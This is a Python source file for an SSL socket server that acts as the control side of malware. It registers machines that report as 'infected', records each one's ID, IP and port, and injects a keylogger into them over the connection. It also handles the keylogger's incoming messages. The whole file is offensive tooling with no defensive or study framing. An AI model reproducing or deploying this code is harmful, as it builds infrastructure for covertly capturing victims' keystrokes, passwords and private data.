import asyncio
import aiofiles
import ssl
from classes.user import User
from dataManager.dataManager import DataManager
from dataManager.repository.userRepository import UserRepository
import logging
from modules.Keylogger import Keylogger

class SocketServer:
    def __init__(self, host="0.0.0.0", port=4242, data_manager=None, certfile='certs/cert.pem', keyfile='certs/key.pem'):
        self.host = host
        self.port = port
        self.data_manager: DataManager = data_manager
        self.user_repository: UserRepository = data_manager.user_repository
        self.certfile = certfile
        self.keyfile = keyfile
        self.keylogger = Keylogger(self.user_repository)

    async def handle_client(self, reader: asyncio.StreamReader, writer : asyncio.StreamWriter):

        ip, port = writer.get_extra_info('peername')
        logging.info(f"Connection received from {ip}\n")


        while True:
            data = await reader.read(4096)
            logging.info(data)
            service, uuid, params = data.decode().split("|||") 
            message = await self.route(service, uuid, params, reader, writer, ip, port)
            if message == "[close]":
                writer.close()
                await writer.wait_closed()
                break

            

    async def route(self, service, uuid, params, reader, writer, ip, port):
        if service == "infected":
            self.user_repository.add_user(User(uuid, ip, port, reader, writer))
            await self.keylogger.inject(reader, writer, uuid)
        elif service == "keylogger":
            await self.keylogger.action(params, uuid)
            return "[close]"
        else:
            logging.error(f"Unknown service: {service}")

    async def start(self):
        # Create an SSL context
        ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        ssl_context.load_cert_chain(certfile=self.certfile, keyfile=self.keyfile)

        # Start the server with SSL
        server = await asyncio.start_server(
            self.handle_client, self.host, self.port, ssl=ssl_context
        )
        addr = server.sockets[0].getsockname()
        logging.info(f"Serveur SSL en écoute sur {addr}\n")

        async with server:
            await server.serve_forever()
